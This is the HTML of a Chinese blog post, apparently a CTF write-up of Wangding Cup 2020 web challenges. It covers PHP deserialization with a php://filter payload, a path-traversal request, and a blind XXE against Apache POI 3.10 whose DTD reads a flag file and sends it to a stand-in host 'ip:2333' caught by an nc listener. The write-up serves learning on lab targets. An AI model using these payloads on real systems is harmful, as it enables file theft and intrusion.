@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="FBx6u1uWmY">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://chenzidu.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":false,"style":"default"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    sidebarPadding: 40
+  };
+</script>
+  <meta name="description" content="看来反序列化要多打点了，反序列化这块都不怎么熟~">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯2020青龙组-web">
+<meta property="og:url" content="https://chenzidu.github.io/2020/05/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-web/index.html">
+<meta property="og:site_name" content="Chen&#39;Blog">
+<meta property="og:description" content="看来反序列化要多打点了，反序列化这块都不怎么熟~">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://chenzidu.github.io/2020/05/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-web/1.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2020/05/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-web/2.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2020/05/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-web/3.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2020/05/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-web/4.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2020/05/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-web/5.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2020/05/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-web/6.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2020/05/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-web/7.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2020/05/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-web/8.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2020/05/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-web/9.jpg">
+<meta property="article:published_time" content="2020-05-12T10:57:16.000Z">
+<meta property="article:modified_time" content="2022-12-11T09:31:21.954Z">
+<meta property="article:author" content="ChenZIDu">
+<meta property="article:tag" content="nodejs">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://chenzidu.github.io/2020/05/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-web/1.jpg">
+
+<link rel="canonical" href="https://chenzidu.github.io/2020/05/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-web/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>网鼎杯2020青龙组-web | Chen'Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Chen'Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Chen'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">Life has its own fate, and meeting may not be accidental.</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chenzidu.github.io/2020/05/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="ChenZIDu">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen'Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          网鼎杯2020青龙组-web
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-05-12 18:57:16" itemprop="dateCreated datePublished" datetime="2020-05-12T18:57:16+08:00">2020-05-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-12-11 17:31:21" itemprop="dateModified" datetime="2022-12-11T17:31:21+08:00">2022-12-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index">
+                    <span itemprop="name">反序列化</span>
+                  </a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Apache-POI-3-10%E6%B3%A8%E5%85%A5XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E8%AE%BF%E9%97%AE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E8%B5%84%E6%BA%90%E6%88%96%E8%80%85%E8%AF%BB%E5%8F%96%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E3%80%82/" itemprop="url" rel="index">
+                    <span itemprop="name">Apache POI 3.10注入XML外部实体访问外部实体资源或者读取任意文件。</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+<span class="post-time">
+	   &nbsp; | &nbsp;
+           <span class="post-meta-item-icon">
+             <i class="fa fa-calendar-o"></i>
+           </span>
+           <span class="post-meta-item-text">字数统计:</span>
+           <span class="post-count">1.2k(字)</span>
+           
+         </span>
+	  
+      <span class="post-time">
+	   &nbsp; | &nbsp;
+           <span class="post-meta-item-icon">
+             <i class="fa fa-calendar-o"></i>
+           </span>
+           <span class="post-meta-item-text">阅读时长:</span>
+           <span class="post-count">5(分)</span>
+           
+        </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/05/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-web/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/05/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-web/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>看来反序列化要多打点了，反序列化这块都不怎么熟~</p>
+<a id="more"></a>
+<h2 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $op;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $filename;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $content;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        $op = <span class="string">"1"</span>;</span></span><br><span class="line"><span class="php">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span></span><br><span class="line"><span class="php">        $content = <span class="string">"Hello World!"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;process();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;write();</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span></span><br><span class="line"><span class="php">            $res = <span class="keyword">$this</span>-&gt;read();</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;output($res);</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span></span><br><span class="line"><span class="php">                <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        $res = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span></span><br><span class="line"><span class="php">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $res;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $s;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;process();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    $str = (string)$_GET[<span class="string">'str'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(is_valid($str)) &#123;</span></span><br><span class="line"><span class="php">        $obj = unserialize($str);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p id="div-border-left-red">考点：<br>&nbsp;&nbsp;序列化后产生不可见字符<br></p>
+
+<h3 id="private、protected序列化后产生不可见字符"><a href="#private、protected序列化后产生不可见字符" class="headerlink" title="private、protected序列化后产生不可见字符"></a>private、protected序列化后产生不可见字符</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span>属性序列化的时候格式是 %<span class="number">00</span>类名%<span class="number">00</span>成员名</span><br><span class="line"><span class="keyword">protected</span>属性序列化的时候格式是 %<span class="number">00</span>*%<span class="number">00</span>成员名</span><br></pre></td></tr></table></figure>
+<h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>而<b>__destruct()</b>这个魔术方法在每次销毁一个对象时触发。<br>而 PHP 的特性 「 运行完一次请求则销毁环境 」 的做法。反正执行完请求后所有该销毁的都会销毁。<br>但是我们要把op == 2才能进入read利用</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>PHP7.1以上的反序列化不会判断里面参数的属性类型了，所以可以改成public再进行反序列化，绕过private、protected序列化后产生不可见字符。__destruct()方法，当op===”2”时会将”2”变成”1”,可以把op转成int型进行绕过~</p>
+<h3 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h3><p>因为默认路径改了个名~<br>先读取一下index.php<br><img src="1.jpg" alt="serialize"><br><img src="2.jpg" alt=""></p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">11</span>:<span class="string">"FileHandler"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"op"</span>;<span class="string">i:</span><span class="number">2</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"filename"</span>;<span class="string">s:</span><span class="number">58</span>:<span class="string">"php://filter/read=convert.base64-encode/resource=index.php"</span>;<span class="string">s:</span><span class="number">7</span>:<span class="string">"content"</span>;N;&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到成功读取了<br>但是读不到flag.php~~<br><b>linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的信息。</b></p>
+<p>下面内容来自<a href="https://imagin.vip/?p=1391" target="_blank" rel="noopener">imagin</a></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> maps 记录一些调用的扩展或者自定义 so 文件</span><br><span class="line"><span class="number">2.</span> environ 环境变量</span><br><span class="line"><span class="number">3.</span> comm 当前进程运行的程序</span><br><span class="line"><span class="number">4.</span> cmdline 程序运行的绝对路径</span><br><span class="line"><span class="number">5.</span> cpuset docker 环境可以看 machine ID</span><br><span class="line"><span class="number">6.</span> cgroup docker环境下全是 machine ID 不太常用</span><br></pre></td></tr></table></figure>
+
+<p>利用/proc/self/cmdline找到当前运行程序的路径，<br>然后找到当前的网站根目录配置文件。<br>不过好像相对路径也可以~</p>
+<h2 id="filejava"><a href="#filejava" class="headerlink" title="filejava"></a>filejava</h2><p>一开始还以为是java上传题，后来下载时候发现可能是目录穿越。<br><img src="3.jpg" alt=""><br>可以看到路径，看看WEB-INF下面的web.xml试试</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/local/</span>tomcat<span class="regexp">/webapps/</span>ROOT<span class="regexp">/WEB-INF/</span>web.xml</span><br></pre></td></tr></table></figure>
+<p>比赛的时候和buu的路径不太一样。<br><img src="4.jpg" alt=""></p>
+<p><img src="5.jpg" alt=""><br>一共三个文件，在UploadServlet.class文件中存在上传<code>poi-ooxml-3.10 has something wrong</code>这样的输出，发现3.10有一个漏洞</p>
+<p><img src="6.jpg" alt=""></p>
+<p><a href="https://www.jianshu.com/p/73cd11d83c30" target="_blank" rel="noopener">Apache POI 3.10-FINAL及以前版本被发现允许远程攻击者通过注入XML外部实体访问外部实体资源或者读取任意文件。</a></p>
+<h3 id="构造Blind-OOB-XXE"><a href="#构造Blind-OOB-XXE" class="headerlink" title="构造Blind OOB XXE"></a>构造Blind OOB XXE</h3><p>上传引入我们的vps里的dtd的一个xml的外部实体攻击<br><br>上传的文件满足两个条件：<br></p>
+<ol>
+<li>以<code>excel-</code>开头</li>
+<li>以<code>xlsx</code>结尾</li>
+</ol>
+<p><b>我在BUU上复现的，BUU靶机只能内网访问。所以需要用小号开一个Basic里面的linux靶机</b></p>
+<p>在/var/www/html/下构建一个1.dtd</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:2333?%file;'&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>先创建一个xlsx文件，然后改后缀为zip修改里面的[Content_Types].xml文件。(先把该文件单独解压出来，修改完后再压进去)</p>
+<p><img src="7.jpg" alt=""></p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip/1.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%remote;%int;%send;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br></pre></td></tr></table></figure>
+<p>再将文件后缀改为xlsx文件</p>
+<p>监控我们linux靶机的2333端口(记得进去/var/www/html):<br></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp <span class="number">2333</span></span><br></pre></td></tr></table></figure>
+<p>然后上传我们的xlsx文件就行了</p>
+<p><img src="8.jpg" alt=""></p>
+<p>就可以看到靶机上的注入结果了<br><img src="9.jpg" alt=""></p>
+<h2 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h2><p><a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">CVE-2019-10795 undefsafe原型链污染</a><br>最近在研究jsouyp搞爬虫,准备开发个阅读器自用= =,最后一题等我有时间在做好了,node这方面也不怎么熟,希望后面用vue开发完后能很快理解<del>~</del></p>
+<hr>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/fish-pompom/p/11126473.html" target="_blank" rel="noopener">PHP反序列化从初级到高级利用篇</a><br><a href="https://blog.csdn.net/dillanzhou/article/details/82876575" target="_blank" rel="noopener">proc/self/目录的意义</a><br><a href="https://blog.csdn.net/weixin_43784056/article/details/106099498?fps=1&locationNum=2" target="_blank" rel="noopener">网鼎杯-web</a><br><a href="https://www.jianshu.com/p/73cd11d83c30" target="_blank" rel="noopener">Apache POI XML外部实体（XML External Entity，XXE）攻击详解</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/nodejs/" rel="tag"># nodejs</a>
+              <a href="/tags/WEB/" rel="tag"># WEB</a>
+              <a href="/tags/java/" rel="tag"># java</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/05/09/De1CTF-%E5%A4%8D%E7%8E%B0-web/" rel="prev" title="De1CTF(复现) web">
+      <i class="fa fa-chevron-left"></i> De1CTF(复现) web
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/05/18/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-web/" rel="next" title="网鼎杯2020朱雀组-web">
+      网鼎杯2020朱雀组-web <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
